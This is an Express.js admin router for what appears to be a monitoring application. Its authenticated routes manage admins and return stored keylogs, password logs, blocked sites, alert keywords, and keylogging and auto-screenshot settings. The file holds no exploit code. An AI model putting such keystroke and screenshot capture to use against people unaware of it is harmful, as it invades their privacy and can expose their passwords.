const express = require('express');
const router = express.Router();
const adminController = require('../controllers/adminController');
const authenticate = require('../middleware/authMiddleware');

router.post('/create', authenticate, adminController.createAdmin);
router.get('/list', authenticate, adminController.listAdmins);
router.get('/password-logs', authenticate, adminController.getPasswordLogs);
router.patch('/:id/toggle-status', authenticate, adminController.toggleStatus);
router.patch('/:id/extend-expiry', authenticate, adminController.extendExpiry);
router.put('/:id', authenticate, adminController.updateAdmin);
router.delete('/:id', authenticate, adminController.deleteAdmin);

// ─── Keylog History ───────────────────────────────────────────────────────────
router.get('/keylogs', authenticate, async (req, res) => {
    try {
        const Keylog = require('../models/Keylog');
        const logs = await Keylog.find({ adminId: req.user.id })
            .sort({ timestamp: -1 })
            .limit(500);
        res.json(logs);
    } catch (err) {
        res.status(500).json({ message: 'Failed to fetch keylogs' });
    }
});

// ─── Admin Settings (blocked sites, alert keywords) ──────────────────────────
router.get('/settings', authenticate, async (req, res) => {
    try {
        const User = require('../models/User');
        const user = await User.findById(req.user.id).select('blockedSites alertKeywords keylogEnabled autoScreenshotsEnabled');
        res.json(user);
    } catch (err) {
        res.status(500).json({ message: 'Failed to fetch settings' });
    }
});

module.exports = router;
